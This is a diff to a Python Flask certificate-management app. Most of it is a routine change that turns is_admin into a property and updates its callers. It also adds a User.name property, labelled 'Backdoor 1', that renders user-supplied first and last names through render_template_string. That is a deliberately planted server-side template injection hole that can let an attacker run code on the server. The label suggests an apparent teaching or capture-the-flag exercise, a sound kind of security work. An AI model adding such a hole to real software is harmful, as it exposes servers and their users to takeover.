@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 
 import base64
-from datetime import timedelta
 import hashlib
 import io
 import os
@@ -14,8 +13,9 @@ from functools import wraps
 import requests
 from cryptography import x509
 from cryptography.x509.oid import NameOID
-from flask import (Flask, flash, g, redirect, render_template, request,
-                   send_file, session, url_for)
+from flask import (Flask, flash, g, redirect, render_template,
+                   render_template_string, request, send_file, session,
+                   url_for)
 from flask_sqlalchemy import SQLAlchemy
 from flask_wtf.csrf import CSRFProtect
 
@@ -56,8 +56,22 @@ class User(db.Model):
     email = db.Column(db.String(64), nullable=False)
     pwd = db.Column(db.String(64), nullable=False)
 
+    @property
     def is_admin(self) -> str:
         return self.uid == 'admin'
+
+    @property
+    def name(self) -> str:
+        '''Backdoor 1'''
+        if not self.firstname and not self.lastname:
+            name = self.uid
+        elif self.firstname and self.lastname:
+            name = f'{self.firstname} {self.lastname}'
+        elif self.firstname:
+            name = self.firstname
+        else:
+            name = self.lastname
+        return render_template_string(name)
 
     @staticmethod
     def hash_pwd(pwd: str) -> str:
@@ -80,7 +94,7 @@ def admin_required(f):
         if not g.user:
             flash('You need to log in first.', 'error')
             return redirect(url_for('get_login', next=request.path))
-        if not g.user.is_admin():
+        if not g.user.is_admin:
             flash('You do not have permission to access the page.', 'error')
             return redirect(url_for('index'))
         return f(*args, **kwargs)
@@ -220,7 +234,7 @@ def get_profile(uid):
     if not uid:
         return redirect(url_for('get_profile', uid=g.user.uid))
 
-    if not g.user.is_admin() and g.user.uid != uid:
+    if not g.user.is_admin and g.user.uid != uid:
         flash('You do not have permission to access the page.', 'error')
         return redirect(url_for('index'))
 
@@ -247,7 +261,7 @@ def get_profile(uid):
 @app.post('/profile/<string:uid>/change_password')
 @login_required
 def post_change_password(uid):
-    if not g.user.is_admin() and g.user.uid != uid:
+    if not g.user.is_admin and g.user.uid != uid:
         flash('You do not have permission to access the page.', 'error')
         return redirect(url_for('index'))
 
@@ -279,7 +293,7 @@ def post_change_password(uid):
 @app.post('/profile/<string:uid>/issue')
 @login_required
 def post_issue(uid):
-    if (g.user.is_admin() and g.user.uid == uid) or (not g.user.is_admin() and g.user.uid != uid):
+    if (g.user.is_admin and g.user.uid == uid) or (not g.user.is_admin and g.user.uid != uid):
         flash('You do not have permission to access the page.', 'error')
         return redirect(url_for('index'))
 
@@ -330,7 +344,7 @@ def post_issue(uid):
 @app.post('/profile/<string:uid>/revoke')
 @login_required
 def post_revoke(uid):
-    if not g.user.is_admin() and g.user.uid != uid:
+    if not g.user.is_admin and g.user.uid != uid:
         flash('You do not have permission to access the page.', 'error')
         return redirect(url_for('index'))
 
@@ -350,7 +364,7 @@ def post_revoke(uid):
         flash('You must specify serial IDs.', 'error')
         return redirect(url_for('get_profile', uid=user.uid))
 
-    if not g.user.is_admin() and g.user.uid != uid:
+    if not g.user.is_admin and g.user.uid != uid:
         flash('You do not have permission to access the page.', 'error')
         return redirect(url_for('index'))
 
